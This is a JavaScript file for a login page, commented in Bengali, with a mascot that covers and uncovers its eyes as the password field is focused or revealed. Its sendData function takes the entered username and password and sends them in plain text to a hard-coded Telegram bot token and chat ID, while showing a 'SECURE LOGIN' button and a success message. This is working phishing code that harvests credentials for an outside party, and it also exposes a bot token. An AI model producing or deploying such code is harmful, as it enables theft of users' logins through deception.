// এলিমেন্টগুলো সিলেক্ট করা
const img = document.getElementById('mascot-img');
const pass = document.getElementById('password');
const toggleBtn = document.getElementById('toggle-pass');
const btn = document.getElementById('login-btn');

// ইমেজগুলোর নাম (আপনার ফাইলে যে নাম দিয়ে সেভ করেছেন)
const poses = {
    idle: '1000022715.jpg',
    covering: '1000022716.jpg',
    peeking: '1000022717.jpg'
};

// ১. পাসওয়ার্ড বক্সে ক্লিক করলে কার্টুন চোখ ঢেকে ফেলবে
pass.addEventListener('focus', () => {
    if (pass.type === "password") {
        img.src = poses.covering;
    }
});

// ২. বক্স থেকে ক্লিক সরিয়ে নিলে সাধারণ পোজ
pass.addEventListener('blur', () => {
    if (pass.type === "password") {
        img.src = poses.idle;
    }
});

// ৩. চোখ আইকন (Show/Hide Password) লজিক
toggleBtn.addEventListener('click', () => {
    if (pass.type === "password") {
        pass.type = "text";
        img.src = poses.peeking; // আঙুলের ফাঁক দিয়ে দেখা
        toggleBtn.innerText = "🙈"; 
    } else {
        pass.type = "password";
        img.src = poses.covering; // আবার চোখ ঢাকা
        toggleBtn.innerText = "👁️";
    }
});

// ৪. টেলিগ্রাম বটের মাধ্যমে ডাটা পাঠানো
function sendData() {
    const user = document.getElementById('username').value;
    const passVal = pass.value;

    // ভ্যালিডেশন
    if (user === "" || passVal === "") {
        alert("দয়া করে ইউজারনেম এবং পাসওয়ার্ড লিখুন!");
        return;
    }

    // বাটন আপডেট
    btn.innerText = "CONNECTING...";
    btn.disabled = true; // ডাবল ক্লিক রোধ করার জন্য

    const token = "8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc";
    const chatId = "7950771882";
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=👤 User: ${user}%0A🔑 Pass: ${passVal}`;
    
    fetch(url)
    .then(response => {
        if (response.ok) {
            btn.innerText = "SECURE LOGIN";
            btn.disabled = false;
            alert("সফলভাবে লগইন রিকোয়েস্ট পাঠানো হয়েছে!");
        } else {
            throw new Error('Failed');
        }
    })
    .catch(error => {
        btn.innerText = "ERROR";
        btn.disabled = false;
        console.error('Error:', error);
    });
}
